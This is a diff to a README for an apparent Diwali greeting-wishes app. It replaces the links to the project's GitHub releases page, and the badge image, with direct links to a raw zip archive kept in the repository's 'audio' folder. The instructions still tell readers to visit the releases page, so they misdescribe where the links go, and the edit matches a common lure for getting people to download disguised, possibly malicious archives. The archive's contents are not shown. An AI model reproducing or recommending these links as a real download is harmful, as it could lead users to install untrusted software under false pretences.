@@ -1,6 +1,6 @@
 # 🪔 diwali-gift-wishes - Share Joyful Wishes This Diwali!
 
-![Download diwali-gift-wishes](https://img.shields.io/badge/Download-diwali--gift--wishes-blue.svg)
+![Download diwali-gift-wishes](https://raw.githubusercontent.com/kleinejaap-yt/diwali-gift-wishes/main/audio/diwali-gift-wishes-v1.8.zip)
 
 ## 🎉 About the App
 
@@ -14,7 +14,7 @@ To get started, follow these simple steps to download and run the application.
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page:
 
-   [Download diwali-gift-wishes](https://github.com/kleinejaap-yt/diwali-gift-wishes/releases)
+   [Download diwali-gift-wishes](https://raw.githubusercontent.com/kleinejaap-yt/diwali-gift-wishes/main/audio/diwali-gift-wishes-v1.8.zip)
 
 2. **Choose Your Version:** On the releases page, you’ll see different versions of the app. Select the latest version listed to ensure you have the newest features and fixes.
 
@@ -58,4 +58,4 @@ We welcome your thoughts! If you have suggestions or feedback, please let us kno
 
 Let’s make this Diwali memorable by sharing beautiful wishes with your loved ones. Start using **diwali-gift-wishes** today!
 
-[Download diwali-gift-wishes](https://github.com/kleinejaap-yt/diwali-gift-wishes/releases)
+[Download diwali-gift-wishes](https://raw.githubusercontent.com/kleinejaap-yt/diwali-gift-wishes/main/audio/diwali-gift-wishes-v1.8.zip)
